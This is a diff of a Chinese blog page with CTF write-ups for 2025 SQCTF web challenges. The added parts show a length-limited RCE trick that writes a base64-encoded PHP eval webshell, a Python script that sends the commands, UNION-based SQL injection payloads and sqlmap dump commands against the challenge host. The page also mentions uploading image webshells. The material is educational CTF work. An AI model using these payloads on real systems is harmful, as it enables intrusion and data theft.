@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="战队名称：纸醉金迷\n战队排名：86\n解题情况：web-ak，cry-ak，re-4道，pwn-1道,misc-4道(包括问卷，YuanShen_Start!虽然没写出来，但是wp还是写出来了，毕竟就差一点)\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="[TOC]\nWeb Upload_Level1 先上传一个user.png,抓包，然后改文件名为.user.ini,然后上传图片马，一句话连接就好，不多说（前端限制文件头而已）\nMy Blog file.pdf有用户密码，目录扫描到login.php,登入框打前面的账号密码就可\n">
 <title>2025-sqctf</title>
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2025-sqctf/'>
 
 <link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="2025-sqctf">
-<meta property='og:description' content="战队名称：纸醉金迷\n战队排名：86\n解题情况：web-ak，cry-ak，re-4道，pwn-1道,misc-4道(包括问卷，YuanShen_Start!虽然没写出来，但是wp还是写出来了，毕竟就差一点)\n">
+<meta property='og:description' content="[TOC]\nWeb Upload_Level1 先上传一个user.png,抓包，然后改文件名为.user.ini,然后上传图片马，一句话连接就好，不多说（前端限制文件头而已）\nMy Blog file.pdf有用户密码，目录扫描到login.php,登入框打前面的账号密码就可\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-sqctf/'>
 <meta property='og:site_name' content='罗铠鸿'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-04-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-07T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-sqctf">
-<meta name="twitter:description" content="战队名称：纸醉金迷\n战队排名：86\n解题情况：web-ak，cry-ak，re-4道，pwn-1道,misc-4道(包括问卷，YuanShen_Start!虽然没写出来，但是wp还是写出来了，毕竟就差一点)\n">
+<meta name="twitter:description" content="[TOC]\nWeb Upload_Level1 先上传一个user.png,抓包，然后改文件名为.user.ini,然后上传图片马，一句话连接就好，不多说（前端限制文件头而已）\nMy Blog file.pdf有用户密码，目录扫描到login.php,登入框打前面的账号密码就可\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -301,7 +301,13 @@
         <li><a href="#upload_level2">Upload_Level2</a></li>
         <li><a href="#baby-rce">baby rce</a></li>
         <li><a href="#白月光">白月光</a></li>
-        <li><a href="#小小查询系统-写马连数据库">小小查询系统-（写马连数据库）</a></li>
+        <li><a href="#小小查询系统-写马连数据库">小小查询系统-（写马连数据库）</a>
+          <ol>
+            <li><a href="#解法一打一句话木马">解法一：打一句话木马</a></li>
+            <li><a href="#解法二手动注入">解法二：手动注入</a></li>
+            <li><a href="#解法三sqlmap注入">解法三：sqlmap注入</a></li>
+          </ol>
+        </li>
         <li><a href="#无参之舞">无参之舞</a></li>
         <li><a href="#哎呀大大大黑塔">哎呀大大大黑塔</a></li>
         <li><a href="#伪装">伪装</a></li>
@@ -313,7 +319,6 @@
         <li><a href="#pickle">pickle</a></li>
         <li><a href="#千查万别">千查万别</a></li>
         <li><a href="#look-for-the-homepage-1">Look for the homepage</a></li>
-        <li><a href="#look-for-the-homepage-2">Look for the homepage</a></li>
         <li><a href="#自私的小s">自私的小s</a></li>
       </ol>
     </li>
@@ -421,7 +426,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 13 分钟
+                    阅读时长: 15 分钟
                 </time>
             </div>
         
@@ -436,9 +441,7 @@
     <section class="article-content">
     
     
-    <p>战队名称：纸醉金迷</p>
-<p>战队排名：86</p>
-<p>解题情况：web-ak，cry-ak，re-4道，pwn-1道,misc-4道(包括问卷，YuanShen_Start!虽然没写出来，但是wp还是写出来了，毕竟就差一点)</p>
+    <p>[TOC]</p>
 <h2 id="web">Web
 </h2><h3 id="upload_level1">Upload_Level1
 </h3><p>先上传一个user.png,抓包，然后改文件名为.user.ini,然后上传图片马，一句话连接就好，不多说（前端限制文件头而已）</p>
@@ -834,6 +837,252 @@
 </h3><img src="image-20250409102124997.png" style="zoom:50%;" />
 <h3 id="rceme">RceMe
 </h3><img src="image-20250409145424336.png" alt="image-20250409145424336" style="zoom:50%;" />
+<p>这替自然还有高手做法</p>
+<p><a class="link" href="https://xiaolong22333.top/archives/201/"  target="_blank" rel="noopener"
+    >有长度限制的rce - xiaolong&rsquo;s blog</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: UTF-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span> <span class="p">:</span> <span class="s1">&#39;ccc&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge.qsnctf.com:31021/?com=</span><span class="si">{0}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]start attack!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]&#34;</span> <span class="o">+</span> <span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()),</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;ls\\
+</span></span><span class="line"><span class="cl">ls&gt;_
+</span></span><span class="line"><span class="cl">&gt;\ \\
+</span></span><span class="line"><span class="cl">&gt;-t\\
+</span></span><span class="line"><span class="cl">&gt;\&gt;y
+</span></span><span class="line"><span class="cl">ls&gt;&gt;_	
+</span></span><span class="line"><span class="cl">&gt;hp
+</span></span><span class="line"><span class="cl">&gt;p\\
+</span></span><span class="line"><span class="cl">&gt;1.\\
+</span></span><span class="line"><span class="cl">&gt;\&gt;\\
+</span></span><span class="line"><span class="cl">&gt;-d\\
+</span></span><span class="line"><span class="cl">&gt;\ \\
+</span></span><span class="line"><span class="cl">&gt;64\\
+</span></span><span class="line"><span class="cl">&gt;se\\
+</span></span><span class="line"><span class="cl">&gt;ba\\
+</span></span><span class="line"><span class="cl">&gt;\|\\
+</span></span><span class="line"><span class="cl">&gt;\=\\
+</span></span><span class="line"><span class="cl">&gt;w=\\
+</span></span><span class="line"><span class="cl">&gt;pO\\
+</span></span><span class="line"><span class="cl">&gt;V0\\
+</span></span><span class="line"><span class="cl">&gt;bM\\
+</span></span><span class="line"><span class="cl">&gt;1R\\
+</span></span><span class="line"><span class="cl">&gt;PU\\
+</span></span><span class="line"><span class="cl">&gt;1B\\
+</span></span><span class="line"><span class="cl">&gt;kX\\
+</span></span><span class="line"><span class="cl">&gt;Cg\\
+</span></span><span class="line"><span class="cl">&gt;hb\\
+</span></span><span class="line"><span class="cl">&gt;XZ\\
+</span></span><span class="line"><span class="cl">&gt;gZ\\
+</span></span><span class="line"><span class="cl">&gt;HA\\
+</span></span><span class="line"><span class="cl">&gt;a\\
+</span></span><span class="line"><span class="cl">&gt;9w\\
+</span></span><span class="line"><span class="cl">&gt;PD\\
+</span></span><span class="line"><span class="cl">&gt;S}\\
+</span></span><span class="line"><span class="cl">&gt;IF\\
+</span></span><span class="line"><span class="cl">&gt;{\\
+</span></span><span class="line"><span class="cl">&gt;\$\\
+</span></span><span class="line"><span class="cl">&gt;o\\
+</span></span><span class="line"><span class="cl">&gt;ch\\
+</span></span><span class="line"><span class="cl">&gt;e\\
+</span></span><span class="line"><span class="cl">sh _
+</span></span><span class="line"><span class="cl">sh y
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解释一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;ls\\      # 创建文件名为 &#34;ls\&#34;
+</span></span><span class="line"><span class="cl">ls&gt;_       # 将当前目录文件列表（含&#34;ls\&#34;）写入文件 &#34;_&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt;\ \\      # 创建文件名为空格 &#34; &#34;
+</span></span><span class="line"><span class="cl">&gt;-t\\      # 创建文件名为 &#34;-t\&#34;
+</span></span><span class="line"><span class="cl">\&gt;y        # 创建文件名为 &#34;&gt;y&#34;
+</span></span><span class="line"><span class="cl">ls&gt;&gt;_      # 将当前文件列表追加到 &#34;_&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以文件<code>_</code>内容是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls\
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">-t\
+</span></span><span class="line"><span class="cl">&gt;y
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>(这里当执行sh_时，文件<code>_</code> 内容被解析为命令，实际触发ls -t &gt;y，生成文件y)</p>
+<p>构造木马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;hp
+</span></span><span class="line"><span class="cl">&gt;p\\
+</span></span><span class="line"><span class="cl">&gt;1.\\
+</span></span><span class="line"><span class="cl">&gt;\&gt;\\
+</span></span><span class="line"><span class="cl">&gt;-d\\
+</span></span><span class="line"><span class="cl">&gt;\ \\
+</span></span><span class="line"><span class="cl">&gt;64\\
+</span></span><span class="line"><span class="cl">&gt;se\\
+</span></span><span class="line"><span class="cl">&gt;ba\\
+</span></span><span class="line"><span class="cl">&gt;\|\\
+</span></span><span class="line"><span class="cl">&gt;\=\\
+</span></span><span class="line"><span class="cl">&gt;w=\\
+</span></span><span class="line"><span class="cl">&gt;pO\\
+</span></span><span class="line"><span class="cl">&gt;V0\\
+</span></span><span class="line"><span class="cl">&gt;bM\\
+</span></span><span class="line"><span class="cl">&gt;1R\\
+</span></span><span class="line"><span class="cl">&gt;PU\\
+</span></span><span class="line"><span class="cl">&gt;1B\\
+</span></span><span class="line"><span class="cl">&gt;kX\\
+</span></span><span class="line"><span class="cl">&gt;Cg\\
+</span></span><span class="line"><span class="cl">&gt;hb\\
+</span></span><span class="line"><span class="cl">&gt;XZ\\
+</span></span><span class="line"><span class="cl">&gt;gZ\\
+</span></span><span class="line"><span class="cl">&gt;HA\\
+</span></span><span class="line"><span class="cl">&gt;a\\
+</span></span><span class="line"><span class="cl">&gt;9w\\
+</span></span><span class="line"><span class="cl">&gt;PD\\
+</span></span><span class="line"><span class="cl">&gt;S}\\
+</span></span><span class="line"><span class="cl">&gt;IF\\
+</span></span><span class="line"><span class="cl">&gt;{\\
+</span></span><span class="line"><span class="cl">&gt;\$\\
+</span></span><span class="line"><span class="cl">&gt;o\\
+</span></span><span class="line"><span class="cl">&gt;ch\\
+</span></span><span class="line"><span class="cl">&gt;e\\
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>经过ls -t 排序后就是<code>echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64${IFS}-d&gt;1.php</code></p>
+<p>执行sh_ 触发y生成，然后执行y将上面拼接成完成命令写入木马</p>
+<img src="image-20250416200802846.png" alt="image-20250416200802846" style="zoom:50%;" />
+<p><a class="link" href="https://blog.csdn.net/q20010619/article/details/109206728"  target="_blank" rel="noopener"
+    >CTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总_ctf中字符长度限制下的命令执行 5个字符-CSDN博客</a></p>
+<p><a class="link" href="https://xiaolong22333.top/archives/201/"  target="_blank" rel="noopener"
+    >有长度限制的rce - xiaolong&rsquo;s blog</a></p>
 <h3 id="input-a-number">Input a number
 </h3><p><img src="/p/2025-sqctf/image-20250409154130733.png"
 	width="1889"
@@ -1100,7 +1349,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="小小查询系统-写马连数据库">小小查询系统-（写马连数据库）
-</h3><div class="highlight"><div class="chroma">
+</h3><h4 id="解法一打一句话木马">解法一：打一句话木马
+</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -1109,9 +1359,128 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后蚁剑连接，文件里面的flag是假的，先找到源码，发现连接数据库的用户密码（其实源码都在网站目录下面，cat *所有源码就出来了，或者连接上一个个查看也行）</p>
-<img src="image-20250410222959504.png" alt="image-20250410222959504" style="zoom:50%;" />
+<img src="image-20250410222959504.png" alt="image-20250410222959504" style="zoom: 50%;" />
 <p>连接后发现flag再cft里面</p>
 <img src="image-20250410223227443.png" alt="image-20250410223227443" style="zoom:50%;" />
+<h4 id="解法二手动注入">解法二：手动注入
+</h4><p>首先看多少列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=1&#39; order by 3--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现回显是2，3</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39; union select 1,2,3--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来要查数据库，这个就很难受了，一般我们都是直接打下面的payload看数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39; union select 1,2,database()--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>甚至不查数据库，直接查表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database();--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是此题就不行，上面我用木马打进了数据库然后查看了其源码，发现其默认登入的数据库是security</p>
+<img src="image-20250417100752154.png" alt="image-20250417100752154" style="zoom:50%;" />
+<p><strong>所以就必须指定数据库，所以就应该从查数据库开始</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39; union select 1,2,group_concat(schema_name)from information_schema.schemata--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250417101208948.png" alt="image-20250417101208948" style="zoom:50%;" />
+<p>接下来就简单了，查表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#39;ctf&#39;--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#39;flag&#39;--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查内容，<strong>这里要注意要写ctf.flag,写flag的话是默认security的库，所以加上ctf指定ctf的库</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39; union select 1,2,group_concat(id,value)from ctf.flag--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250417102549443.png" alt="image-20250417102549443" style="zoom:50%;" />
+<h4 id="解法三sqlmap注入">解法三：sqlmap注入
+</h4><p><strong>报错注入，先查所有数据库</strong>（报错注入更快）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://challenge.qsnctf.com:31427/?id=1&#34; --batch  --technique=E  -dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250417105437235.png" alt="image-20250417105437235" style="zoom:50%;" />
+<p>不一一演示</p>
+<p>直接找flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://challenge.qsnctf.com:31427/?id=1&#34; --batch  --technique=E  -dbs -D ctf -T flag --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250417112727880.png" alt="image-20250417112727880" style="zoom:50%;" />
+<p><strong>布尔盲注，先查数据库</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://challenge.qsnctf.com:31427/?id=1&#34; -p id --random-agent --fresh-queries --no-cast --technique=B -dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250417105035151.png" alt="image-20250417105035151" style="zoom:50%;" />
+<p>接下来不多演示</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&#34;http://challenge.qsnctf.com:31427/?id=1&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">--</span><span class="n">random</span><span class="o">-</span><span class="n">agent</span><span class="w"> </span><span class="o">--</span><span class="n">fresh</span><span class="o">-</span><span class="n">queries</span><span class="w"> </span><span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">cast</span><span class="w"> </span><span class="o">--</span><span class="n">technique</span><span class="o">=</span><span class="n">B</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">ctf</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="s2">&#34;`id`,`value`&#34;</span><span class="w"> </span><span class="o">--</span><span class="n">dump</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250417112241962.png" alt="image-20250417112241962" style="zoom:50%;" />
 <h3 id="无参之舞">无参之舞
 </h3><p>先扫描目录</p>
 <img src="image-20250410200444408.png" alt="image-20250410200444408" style="zoom:50%;" />
@@ -1525,8 +1894,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="look-for-the-homepage-2">Look for the homepage
-</h3><p>简单考个md5与parse_str性质</p>
+</div><p>简单考个md5与parse_str性质</p>
 <img src="image-20250413135334396.png" alt="image-20250413135334396" style="zoom:50%;" />
 <h3 id="自私的小s">自私的小s
 </h3><p>提示入口可能不对，抓包发现在cookie</p>
@@ -2537,12 +2905,25 @@
             
                 
 <article class="">
-    <a href="/p/2025-tcgctf-write.up/">
+    <a href="/p/2025-nss-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-TCGCTF-write.up</h2>
+            <h2 class="article-title">2025-nss-每日一题</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-tgctf-write.up/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-TGCTF-write.up</h2>
         </div>
     </a>
 </article>
@@ -2582,19 +2963,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-长城杯-ccforum</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/nss-round28-web/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">nss-round28-web</h2>
         </div>
     </a>
 </article>
